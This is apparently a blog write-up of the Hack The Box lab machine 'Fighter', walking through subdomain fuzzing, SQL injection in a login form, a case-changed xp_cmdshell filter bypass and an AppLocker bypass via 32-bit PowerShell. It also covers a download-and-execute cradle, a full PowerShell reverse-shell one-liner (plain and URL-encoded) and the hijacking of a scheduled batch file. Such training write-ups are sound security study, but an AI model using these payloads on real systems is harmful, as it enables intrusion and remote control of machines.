---
title: HTB: Fighter
url: https://0xdf.gitlab.io/2022/04/25/htb-fighter.html
date: 2022-04-25T09:00:00+00:00
difficulty: Insane [50]
os: Windows
tags: htb-fighter, hackthebox, ctf, nmap, iis, vhosts, wfuzz, feroxbuster, sqli, burp, burp-repeater, xp-cmdshell, nishang, windows-firewall, applocker, driverquery, capcom-sys, ghidra, python, msbuild, applocker-bypass, msfvenom, msfconsole, metasploit, juicypotato, htb-fuse
---

![Fighter](https://0xdfimages.gitlab.io/img/fighter-cover.png)

Fighter is a solid old Windows box that requires avoiding AppLocker rules to exploit an SQL injection, hijack a bat script, and exploit the imfamous Capcom driver. I’ll show the intended path, as well as some AppLocker bypasses, how to modify the Metasploit Capcom exploit to work, and JuicyPotato (which was born from this box).

## Box Info

| Name | [Fighter](https://hackthebox.com/machines/fighter)  [Fighter](https://hackthebox.com/machines/fighter) [Play on HackTheBox](https://hackthebox.com/machines/fighter) |
| --- | --- |
| Release Date | [05 May 2018](https://twitter.com/hackthebox_eu/status/992008202433781760) |
| Retire Date | 06 Oct 2018 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Fighter |
| Radar Graph | Radar chart for Fighter |
| First Blood User | 16:09:22[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| First Blood Root | 1 day01:16:21[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creators | [decoder decoder](https://app.hackthebox.com/users/1391)  [Cneeliz Cneeliz](https://app.hackthebox.com/users/3244) |

## Recon

### nmap

`nmap` finds one open TCP port, HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.72
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-22 15:44 UTC
Nmap scan report for streetfighterclub.htb (10.10.10.72)
Host is up (0.092s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds
oxdf@hacky$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.10.72
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-22 15:45 UTC
Nmap scan report for streetfighterclub.htb (10.10.10.72)
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: StreetFighter Club
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is likely running Windows Server 2012R2.

### Website - TCP 80

#### Site

The site is a fan club for the [Street Fighter](https://en.wikipedia.org/wiki/Street_Fighter) video game:

[![image-20220422114812951](https://0xdfimages.gitlab.io/img/image-20220422114812951.png)](https://0xdfimages.gitlab.io/img/image-20220422114812951.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220422114812951.png)

The top post is titled “important announcement”, and says:

> We’re currently redesigning our website streetfighterclub.htb for a new modern look and functionality. The new site should be up and running soon.
> Meanwhile our “old” members site is still available for our registered members (p.s you know the link…)

I’ll note the domain `streetfighterclub.htb` and also the reference to a “members” site with an unnamed link. That’s a hint to scan for subdomains. Adding the domain to `/etc/hosts` and revisiting returns the same page.

#### Tech Stack

The HTTP response heads show the box is running IIS, and using ASP.NET:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 21 Nov 2017 11:38:11 GMT
Accept-Ranges: bytes
ETag: "33cf735bd62d31:0"
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Fri, 22 Apr 2022 15:47:16 GMT
Connection: close
Content-Length: 6911

```

The main page loads as `index.html`, so no real hint there about extensions. Still, I can guess probably `.aspx` or `.asp`, if anything.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x aspx,asp,html` since those are what seem most likely to be in use, and a lowercase wordlist since IIS is typically case-insensitive:

```

oxdf@hacky$ feroxbuster -u http://streetfighterclub.htb -x aspx,asp,html -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://streetfighterclub.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [aspx, asp, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      159c http://streetfighterclub.htb/images => http://streetfighterclub.htb/images/
301      GET        2l       10w      156c http://streetfighterclub.htb/css => http://streetfighterclub.htb/css/
200      GET      191l      717w     6911c http://streetfighterclub.htb/index.html
[####################] - 3m    318996/318996  0s      found:3       errors:0      
[####################] - 3m    106332/106332  494/s   http://streetfighterclub.htb 
[####################] - 3m    106332/106332  494/s   http://streetfighterclub.htb/images 
[####################] - 3m    106332/106332  493/s   http://streetfighterclub.htb/css

```

Nothing interesting.

### Subdomain Fuzz

I’ll use `wfuzz` to look for other subdomains that return something different from the main site. I’ll start it, and quickly kill it, observing that the return for the default case is 717 words, 6911 characters, and re-run using `--hh 6911` to filter that response:

```

oxdf@hacky$ wfuzz -u http://streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 6911
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://streetfighterclub.htb/
Total requests: 19966

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000134:   403        29 L     92 W     1233 Ch     "members"
000009532:   400        6 L      26 W     334 Ch      "#www"
000010581:   400        6 L      26 W     334 Ch      "#mail"

Total time: 190.4526
Processed Requests: 19966
Filtered Requests: 19963
Requests/sec.: 104.8344

```

`members` seems like the subdomain the post was referencing.

### members.streetfighterclub.htb

#### Site

Just like `wfuzz` reported, visiting returns a 403 forbidden:

![image-20220422134851224](https://0xdfimages.gitlab.io/img/image-20220422134851224.png)

The post mentioned knowing the URL, which implies there might be more of a path to it.

#### Directory Brute Force

I’ll give `feroxbuster` a go with the same arguments as before, and it finds interesting pages:

```

oxdf@hacky$ feroxbuster -u http://members.streetfighterclub.htb -x aspx,asp,html -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://members.streetfighterclub.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [aspx, asp, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      164c http://members.streetfighterclub.htb/old => http://members.streetfighterclub.htb/old/
200      GET       58l      129w     1821c http://members.streetfighterclub.htb/old/login.asp
302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/welcome.asp => Login.asp
302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/verify.asp => login.asp
[####################] - 3m    212664/212664  0s      found:4       errors:0      
[####################] - 3m    106332/106332  517/s   http://members.streetfighterclub.htb 
[####################] - 3m    106332/106332  517/s   http://members.streetfighterclub.htb/old 

```

`welcome.asp` and `verify.asp` both redirect to `login.asp`.

#### login.asp

The page is a simple login form:

![image-20220422135715203](https://0xdfimages.gitlab.io/img/image-20220422135715203.png)

I’ll try simple admin / admin and a couple other guesses, but it all just comes back to this page.

The requests pattern is a bit odd here. When I submit, it sends a POST to `verify.asp`:

```

POST /old/verify.asp HTTP/1.1
Host: members.streetfighterclub.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Origin: http://members.streetfighterclub.htb
Connection: close
Referer: http://members.streetfighterclub.htb/old/login.asp
Cookie: ASPSESSIONIDAQBBTAAD=GBPLEFHBKLKLPAKJEMPJPPIB
Upgrade-Insecure-Requests: 1

username=admin&password=admin&logintype=2&rememberme=ON&B1=LogIn

```

`logintype` is 2 for user, 1 for administrator. I can see those values in the HTML source:

![image-20220422140847307](https://0xdfimages.gitlab.io/img/image-20220422140847307.png)

The response is a 302 redirect to `Welcome.asp`:

```

HTTP/1.1 302 Object moved
Cache-Control: private
Content-Type: text/html
Location: Welcome.asp
Server: Microsoft-IIS/8.5
Set-Cookie: Email=; path=/
Set-Cookie: Level=%2D1; path=/
Set-Cookie: Chk=4268; path=/
Set-Cookie: password=YWRtaW4%3D; path=/
Set-Cookie: username=YWRtaW4%3D; path=/
X-Powered-By: ASP.NET
Date: Fri, 22 Apr 2022 18:03:22 GMT
Connection: close
Content-Length: 132

<head><title>Object moved</title></head>
<body><h1>Object Moved</h1>This object may be found <a HREF="Welcome.asp">here</a>.</body>

```

If I select the cookie in Burp, it shows that it just decodes to “admin” for both username and password:

![image-20220422141047719](https://0xdfimages.gitlab.io/img/image-20220422141047719.png)

`Welcome.asp` returns a 302 redirect to `Login.asp`.

It’s not clear what these different cookies are for.

## Shell as sqlserv

### Identify SQL

I’ll send the login request over to Burp Repeater to play with. Regardless of what I put into `username` and `password`, it seems to come back just fine, with that value reflected in the new cookie. However, when I put something weird in `logintype`, it crashes:

![image-20220422142746607](https://0xdfimages.gitlab.io/img/image-20220422142746607.png)

It’s expecting a number, and it gets text and crashes. That could be an error in the ASP or in SQL. I’ll see if I can make something that works using SQL syntax. When I change it to `1-- -abcd`, it returns 302 again! That’s SQL injection.

### Union Injection

#### Identify

To do a UNION injection, I’ll need to figure out how many columns are being returned by the query. I’ll start with `1 UNION SELECT 1-- -`. If there’s one column, the original query will return no rows (because I don’t know the username and password), and then this will return a row with one column and that will merge together to be successful. If it’s still a 500 error, that’s likely the wrong number of columns. Then I’ll add another and try again.

With six columns, it returns 302:

[![image-20220422143840214](https://0xdfimages.gitlab.io/img/image-20220422143840214.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220422143840214.png)

Not only does it work, but the fifth column is sent back as the `Email` cookie (and also `Level`, but that’s a fluke).

#### Get Data

I can get data from the DB by replacing the `5` with something like `user`. It returns a cookie of `ZGJv`, which decodes to `dbo`, which is a typical user for a SQL db.

If I change that to `@@version`, it returns:

```

Microsoft SQL Server 2014 - 12.0.2269.0 (X64) 
	Jun 10 2015 03:35:45 
	Copyright (c) Microsoft Corporation
	Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)

```

I can further enumeration the DB from here, but there’s not actually much in it.

### Run Commands

#### Stacked Queries

ASP plus MSSQL is friendly to Stacked Queries by default, as shown in this diagram (from [this post](http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html?fb_comment_id=888843001166690_998866223497700)):

[![img](https://0xdfimages.gitlab.io/img/stacked_q1.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/stacked_q1.png)

Stacked queries means I can add a `;` and then run another query. This makes things much simpler when trying to deal with things like running command via `xp_cmdshell`.

#### Enable xp\_cmdshell

By default, the ability to run commands is not enabled, so I’m going to enable it. As dbo (or database owner), I should be able to.

The commands to enabled are these three:

```

EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

```

I’ll add those into the injection, separate them with `;`, URL encode it all, and send:

![image-20220422150302372](https://0xdfimages.gitlab.io/img/image-20220422150302372.png)

I’m going to interpret lack of an error as success, but looking back, I believe this actually fails, but it doesn’t matter, because `xm_cmdshell` is enabled by default.

#### Failures

Next, I should be able to run a command like `EXEC xp_cmdshell "whoami"`. I’ll use a `ping` command and watch with `tcpdump` at my VM to see if I can get execution. This will work even if no input comes back.

It is possible to get output from these commands by writing the results to a table and then reading them with the injection. IppSec even shows [coding this into an interactive shell](https://www.youtube.com/watch?v=CW4mI5BkP9E&t=173s) in his video. I went a different direction, just working blind.

My first attempt is to send (URL encoded):

```

3;EXEC xp_cmdshell 'ping 10.10.14.6'-- -

```

It returns 500. I’ll try again with double quotes instead of single. It returns a 302 instantly, with no pings.

#### WAF Bypass

It’s not trivial to see, but it’s always a good idea to play with casing on known risky commands like `xp_cmdshell`. That’s the kind of thing that a web application firewall would key on.

When I change the injection to `3;EXEC xp_cmDshElL "ping 10.10.14.6"-- -`, it hangs for five seconds, and there’s ICMP at `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
19:14:48.413133 IP 10.10.10.72 > 10.10.14.6: ICMP echo request, id 1, seq 13, length 40
19:14:48.413227 IP 10.10.14.6 > 10.10.10.72: ICMP echo reply, id 1, seq 13, length 40
19:14:49.424087 IP 10.10.10.72 > 10.10.14.6: ICMP echo request, id 1, seq 14, length 40
19:14:49.424126 IP 10.10.14.6 > 10.10.10.72: ICMP echo reply, id 1, seq 14, length 40
19:14:50.439731 IP 10.10.10.72 > 10.10.14.6: ICMP echo request, id 1, seq 15, length 40
19:14:50.439775 IP 10.10.14.6 > 10.10.10.72: ICMP echo reply, id 1, seq 15, length 40
19:14:51.455371 IP 10.10.10.72 > 10.10.14.6: ICMP echo request, id 1, seq 16, length 40
19:14:51.455400 IP 10.10.14.6 > 10.10.10.72: ICMP echo reply, id 1, seq 16, length 40

```

### Reverse Shell

#### Finding PowerShell

I’ll try the same `ping` command, but invoked with PowerShell (I’ve reordered the parameters to make the changing one more obvious here):

```

logintype=3%3bexecute+xp_cmDshElL+'powershell.exe+-c+ping+10.10.14.6'%3b&username=admin&password=admin&rememberme=ON&B1=Login

```

I don’t see anything come back. This could be because PowerShell isn’t in the path, or PowerShell is being blocked. I can try calling it by full path:

```

logintype=3%3bexecute+xp_cmDshElL+'C:\Windows\system32\windowspowershell\v1.0\powershell.exe+-c+ping+10.10.14.6'%3b&username=admin&password=admin&rememberme=ON&B1=Login

```

Still nothing. I’ll try the 32-bit version located at `C:\Windows\SysWow64\WindowsPowerShell\v1.0\PowerShell.exe`:

```

logintype=3%3bexecute+xp_cmDshElL+'C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe+-c+ping+10.10.14.6'%3b&username=admin&password=admin&rememberme=ON&B1=Login

```

This works! So I know I can access PowerShell Using that path and structure. It seems that AppLocker is likely blocking this account running PowerShell, but the admin forgot about the 32-bit version.

#### Reverse Shell [Option 1]

Because I’m dealing with a blind injection here, I’m going to start with a simple payload that downloads and runs a Powershell script from my server:

```

C:\windows\syswow64\windowspowershell\v1.0\powershell.exe "iex(new-object net.webclient).downloadstring(\"http://10.10.14.6/rev.ps1\")"

```

I’ll have to `\` escape the `"`, and then URL-encode it into this payload:

```

logintype=3%3bexecute+xp_cmDshElL+'C%3a\windows\syswow64\windowspowershell\v1.0\powershell.exe+"iex(new-object+net.webclient).downloadstring(\"http%3a//10.10.14.6/rev.ps1\")"'%3b&username=admin&password=admin&rememberme=ON&B1=Login

```

When I run this, there’s a request for `REV.PS1` on my server:

```
10.10.10.72 - - [24/Apr/2022 10:55:24] "GET /REV.PS1 HTTP/1.1" 200 - 

```

It’s interesting that the MSSQL instance is upper-casing everything, but I can work with that.

I’ll grab a copy of `Invoke-PowerShellTcp.ps1` from [GitHub](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1), and name it `REV.PS1`. I’ll add a line at the end of it to call itself:

```

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 443

```

Now when I run, I get a shell:

```

oxdf@hacky$ rlwrap -cAr ncat -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.72.
Ncat: Connection from 10.10.10.72:49237.
Windows PowerShell running as user sqlserv on FIGHTER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
fighter\sqlserv

```

#### Reverse Shell [Option 2]

It also works to go right to a shell using a PowerShell one line reverse shell. I’ll grab one (PowerShell #1 from [revshells.com](https://www.revshells.com/)), and put it in. It took a good deal of tinkering to get it to work. For one, I had to enclose the command in `"`. For the parts inside that were already in double quotes, I tried single quotes, but that didn’t work. However, escaping the double quotes with `\` did. I’ll also need to escape `>`, as `xp_cmdshell` is invoking `cmd.exe` which will process that as output redirection. I could just remove it (it’s just printed as part of the shell prompt), or escape it with `^` (as shown [here](https://www.robvanderwoude.com/escapechars.php), thanks to [egre55](https://twitter.com/egre55) for the link). I’ll end up with the `xp_cmdshell` string being:

```

C:\windows\syswow64\windowspowershell\v1.0\powershell.exe "$client = new-object system.net.sockets.tcpclient(\"10.10.14.6\",443);$stream = $client.getstream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.read($bytes, 0, $bytes.length)) -ne 0){;$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i);$sendback = (iex $data 2>&1 | out-string );$sendback2 = $sendback + \"PS \" + (pwd).path + \"^> \";$sendbyte = ([text.encoding]::ascii).getbytes($sendback2);$stream.write($sendbyte,0,$sendbyte.length);$stream.flush()};$client.close()";

```

After URL-encoding and formatting that for the POST body, it looks like:

```

logintype=3%3bexecute+xp_cmDshElL+'C%3a\windows\syswow64\windowspowershell\v1.0\powershell.exe+"$client+%3d+new-object+system.net.sockets.tcpclient(\"10.10.14.6\",443)%3b$stream+%3d+$client.getstream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.read($bytes,+0,+$bytes.length))+-ne+0){%3b$data+%3d+(new-object+-typename+system.text.asciiencoding).getstring($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+out-string+)%3b$sendback2+%3d+$sendback+%2b+\"PS+\"+%2b+(pwd).path+%2b+\"^>+\"%3b$sendbyte+%3d+([text.encoding]%3a%3aascii).getbytes($sendback2)%3b$stream.write($sendbyte,0,$sendbyte.length)%3b$stream.flush()}%3b$client.close()"'%3b&username=admin&password=admin&rememberme=ON&B1=Login

```

Passing that as the post body returns a shell (this shell shows a prompt after the first command output):

```

oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.72 49207
whoami
fighter\sqlserv
PS C:\Windows\system32>

```

I’ll use the other shell, because it shows stderr, where as this one doesn’t.

## Shell as decoder

It’s actually not necessry to go to the decoder user, and I’ll show the alternative paths [at the end](#alternative-paths).

### Enumeration

#### OS and System Information

The box is running Windows Server 2012 R2 (just as predicted based on the IIS version):

```

PS C:\> systeminfo    
                                                    
Host Name:                 FIGHTER         
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User    
Registered Organization:                   
Product ID:                00252-70000-00000-AA535
Original Install Date:     19/10/2017, 22:31:21
System Boot Time:          22/04/2022, 18:04:14
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC           
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             it;Italian (Italy)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna
Total Physical Memory:     4.095 MB
Available Physical Memory: 2.719 MB
Virtual Memory: Max Size:  4.799 MB
Virtual Memory: Available: 3.181 MB
Virtual Memory: In Use:    1.618 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 159 Hotfix(s) Installed.
                           [01]: KB2894852
                           [02]: KB2894856
                           [03]: KB2919355
...[snip]...
                           [159]: KB4054519
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.72
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

There are 159 hotfixes applied, which seems like a good indication that the box (at least at release in May 2018) is patched, and that a kernel vuln is not likely the path.

#### Users

sqlserv’s desktop just has a link to [WinDirStat](https://windirstat.net/), a really nice program for finding what is using disk space on Windows, but not really something I can exploit.

There’s three (non-Guest) users on the box, sqlserv, decoder, and Administrator:

```

PS C:\> net user

User accounts for \\FIGHTER
-------------------------------------------------------------------------------
Administrator            decoder                  Guest                    
sqlserv                  
The command completed successfully.

```

I’m able to cd to decoder’s desktop as well, and it’s completely empty.

There is a `clean.bat` file in `C:\users\decoder`:

```

@echo off 
del /q /s c:\users\decoder\appdata\local\TEMP\*.tmp 
exit 

```

I can’t see into that directory, but it seems like the kind of thing that might be running on a scheduled task.

#### Firewall

It turns out I got a bit lucky when going for my initial shell. All the profiles are set to block unless otherwise allowed:

```

PS C:\> Get-NetFirewallProfile

Name                            : Domain
Enabled                         : True
DefaultInboundAction            : Block
DefaultOutboundAction           : Block
...[snip]...

Name                            : Private
Enabled                         : True
DefaultInboundAction            : Block
DefaultOutboundAction           : Block
...[snip]...

Name                            : Public
Enabled                         : True
DefaultInboundAction            : Block
DefaultOutboundAction           : Block
...[snip]...

```

Checking the outbound firewall, it seems that only 80 and 443 are allowed out on TCP:

```

PS C:\> Get-NetFirewallRule -Direction Outbound -Enabled True
...[snip]...
Name                  : {3F5C5261-77AE-4F72-9C2A-4BFCE6CD8CBC}
DisplayName           : http_out
Description           :
DisplayGroup          :
Group                 :                             
Enabled               : True                   
Profile               : Any                        
Platform              : {}
Direction             : Outbound                   
Action                : Allow                       
EdgeTraversalPolicy   : Block            
LooseSourceMapping    : False
LocalOnlyMapping      : False             
Owner                 :                   
PrimaryStatus         : OK                
Status                : The rule was parsed successfully from the store.
                        (65536)
EnforcementStatus     : NotApplicable               
PolicyStoreSource     : PersistentStore     
PolicyStoreSourceType : Local
...[snip]...

```

That’ll be good to know going forward. Had I used some other port while troubleshooting my reverse shell, that would have been an extra real headache.

#### AppLocker

I noted some weirdness with PowerShell earlier. From this 32-bit process, I can only really run the 32-bit PowerShell, but the 64-bit version is blocked by AppLocker. There’s other blocks in place.

For example, I can’t write a `.bat`, `.exe`, or `.ps1` files:

```

PS C:\programdata> echo "test" > 0xdf.txt
PS C:\programdata> echo "test" > 0xdf.bat
Invoke-PowerShellTcp : Access to the path 'C:\programdata\0xdf.bat' is denied.
At line:127 char:1
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
 
PS C:\programdata> echo "test" > 0xdf.exe
Invoke-PowerShellTcp : Access to the path 'C:\programdata\0xdf.exe' is denied.
At line:127 char:1
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
PS C:\programdata> echo "test" > 0xdf.ps1
Invoke-PowerShellTcp : Access to the path 'C:\programdata\0xdf.ps1' is denied.
At line:127 char:1
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp

```

The `exe` files that I can run are limited as well. I’ll keep this in mind as I got forward.

#### Rabbit Holes

In the file system root, there’s a `scripts` directory. It has a bunch of privesc utilities:

```

PS C:\scripts> ls

    Directory: C:\scripts

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        23/10/2017     23:37        492 largebackup.ps1                   
-a---        23/10/2017     23:27         69 powerup.bat                       
-a---        23/10/2017     23:20         69 sherlock.bat                      
-a---        23/10/2017     23:21      18818 sherlock.ps1                      
-a---        15/11/2017     23:54         90 t.bat  

```

`sherlock.ps1` is [Sherlock](https://github.com/rasta-mouse/Sherlock), and older script for identifying common vulnerabilities in Windows. It will return a bunch of stuff, but none of it is actually vulnerable.

### Hijack clean.bat

#### Permissions

Coming back to `C:\users\decoder\clean.bat`, sqlserv has modify privileges (`a`) on the file:

```

PS C:\users\decoder> ls clean.bat 

    Directory: C:\users\decoder

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        08/05/2018     23:54         77 clean.bat   

```

`icacls` shows it more cleanly:

```

PS C:\users\decoder> icacls clean.bat
clean.bat Everyone:(M)
          NT AUTHORITY\SYSTEM:(I)(F)
          FIGHTER\decoder:(I)(F)
          BUILTIN\Administrators:(I)(F)

```

That means I can’t just overwrite it (this shell doesn’t return errors, but it doesn’t work):

```

PS C:\users\decoder> echo "ping 10.10.14.6" > clean.bat
Invoke-PowerShellTcp : Access to the path 'C:\users\decoder\clean.bat' is 
denied.
At line:127 char:1
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp

```

But I can append to it:

```

PS C:\users\decoder> echo "ping 10.10.14.6" >> clean.bat
PS C:\users\decoder> cat clean.bat 
@echo off 
del /q /s c:\users\decoder\appdata\local\TEMP\*.tmp 
exit 
  
ping 10.10.14.6

```

Still, even if that is being run, with the `exit`, nothing I add will be run.

#### Truncate

I can’t actually copy another file on top of the existing file, but for some reason, in `cmd`, I can copy `NUL` onto a file and it handles it like an append:

```

PS C:\users\decoder> cmd /c copy /y NUL clean.bat 
        1 file(s) copied.
PS C:\users\decoder> ls clean.bat

    Directory: C:\users\decoder

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        23/04/2022     23:26          0 clean.bat 

```

In some of the [docs](https://ss64.com/nt/copy.html), it show this is the command to create an empty file:

> Create an empty (zero byte) file:
>
> ```

> COPY NUL EmptyFile.txt
>
> ```

It must be using append permissions to do that.

#### Add POC

With the `exit` gone, I can now add to the payload. I lost a lot of time playing with issues where PowerShell was adding weird characters to the file and it wouldn’t run as a `.bat`. The safest way to do this is with `cmd`, making sure that both the `echo` and the redirection are within `cmd`:

```

PS C:\users\decoder> cmd /c "echo ping 10.10.14.6 >> clean.bat"

```

The next time the minute rolled on Fighter, ICMP packets arrive at my host:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:30:58.618713 IP 10.10.10.72 > 10.10.14.6: ICMP echo request, id 1, seq 69, length 40
21:30:58.618768 IP 10.10.14.6 > 10.10.10.72: ICMP echo reply, id 1, seq 69, length 40
21:30:59.634045 IP 10.10.10.72 > 10.10.14.6: ICMP echo request, id 1, seq 70, length 40
21:30:59.634080 IP 10.10.14.6 > 10.10.10.72: ICMP echo reply, id 1, seq 70, length 40
21:31:00.649225 IP 10.10.10.72 > 10.10.14.6: ICMP echo request, id 1, seq 71, length 40
21:31:00.649255 IP 10.10.14.6 > 10.10.10.72: ICMP echo reply, id 1, seq 71, length 40
